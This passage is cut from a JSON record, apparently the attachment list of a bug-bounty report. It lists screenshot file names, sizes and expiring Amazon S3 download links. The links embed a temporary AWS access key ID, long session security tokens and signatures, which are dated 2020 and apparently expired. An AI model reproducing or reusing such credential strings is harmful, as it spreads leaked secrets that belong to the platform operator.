-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=160a39b9986a03dbd0cf29a515d7708bad30ce45e261d884d09cdeabd437658e","file_size":6618,"type":"image/png"},{"id":539733,"file_name":"______________2019-07-26_14-28-56.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/733/1d32bc573f32c7b191a8b4082fb783982f50153d/______________2019-07-26_14-28-56.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-07-26_14-28-56.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-07-26_14-28-56.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=c2dd1713dfdf13f72707b443bc0226c60fa32b65bcb7f2657ca0bc0578348a90","file_size":16549,"type":"image/png"},{"id":539734,"file_name":"screen4_1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/734/e1048d7fcf785a6b698da647aa5f68fb4d11481a/screen4_1.png?response-content-disposition=attachment%3B%20filename%3D%22screen4_1.png%22%3B%20filename%2A%3DUTF-8%27%27screen4_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=dd8f7e3a8ab970a3d13d9cb8bc2371246b9877accb0a1b16da8999a27b26d386","file_size":31576,"type":"image/png"},{"id":539735,"file_name":"screen_5.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/735/ec06901edc3e787a98506c11f656b2dafcb9d3df/screen_5.png?response-content-disposition=attachment%3B%20filename%3D%22screen_5.png%22%3B%20filename%2A%3DUTF-8%27%27screen_5.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=04a05cecf67b1fbcfe9c024584a67d84593b17c4339ba4f7ef3157b880f25849","file_size":6420,"type":"image/png"},{"id":539736,"file_name":"screen_6.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/736/5135895622dadd5e80418d50d4e838e4a31f48d5/screen_6.png?response-content-disposition=attachment%3B%20filename%3D%22screen_6.png%22%3B%20filename%2A%3DUTF-8%27%27screen_6.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=e71d2df243afd40a565e1ff8c147d46df8648713d76cace4c078bca5944ecdc0","file_size":18837,"type":"image/png"},{"id":539737,"file_name":"screen_7.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/737/55eb919594e37cbcb27704ead50169081ec72e94/screen_7.png?response-content-disposition=attachment%3B%20filename%3D%22screen_7.png%22%3B%20filename%2A%3DUTF-8%27%27screen_7.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=5610085a8af6b16f7a99f9125951a9416a4ad1f0e979a64cb591aeb4b6b37ee4","file_size":6599,"type":"image/png"},{"id":539738,"file_name":"screen_8.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/738/fc5d99368893d134234ed1004960d70d5e0075b8/screen_8.png?response-content-disposition=attachment%3B%20filename%3D%22screen_8.png%22%3B%20filename%2A%3DUTF-8%27%27screen_8.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=efcf6d8f2a1d3ac84913debbc2802564bef6ea6c1fec438697c38542fd1fa59e","file_size":70381,"type":"image/png"},{"id":539739,"file_name":"screen_9.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/739/f0a0a5480f9a580158eb6476577b459feeb1d9ec/screen_9.png?response-content-disposition=attachment%3B%20filename%3D%22screen_9.png%22%3B%20filename%2A%3DUTF-8%27%27screen_9.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=158bbec1597e91b45a17b7233b02a1421a406463d9cde2af24a720b3e327176b","file_size":63205,"type":"image/png"},{"id":539740,"file_name":"pwn.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/740/e0dbef4b6affd485c0228a345cf2b163af9777fd/pwn.png?response-content-disposition=attachment%3B%20filename%3D%22pwn.png%22%3B%20filename%2A%3DUTF-8%27%27pwn.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=df715a80c329c05e9382a36332e1731bd4df99a74b935964a1559aa01e42d519","file_size":59019,"type":"image/png"},{"id":539741,"file_name":"12354.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/741/fa2a05e74e47e34935006c90d4cb0dc47a9576e9/12354.png?response-content-disposition=attachment%3B%20filename%3D%2212354.png%22%3B%20filename%2A%3DUTF-8%27%2712354.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=4b287578e0be68283a7dbd9fe33dcbcbd80ea21c49abd3ef9fba6ff8a4b94fdb","file_size":2048,"type":"image/png"},{"id":539742,"file_name":"screen3_1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/539/742/c4aca7f0e1feb03a46e61279e411989facf465ca/screen3_1.png?response-content-disposition=attachment%3B%20filename%3D%22screen3_1.png%22%3B%20filename%2A%3DUTF-8%27%27screen3_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063430Z\u0026X-Amz-Expires=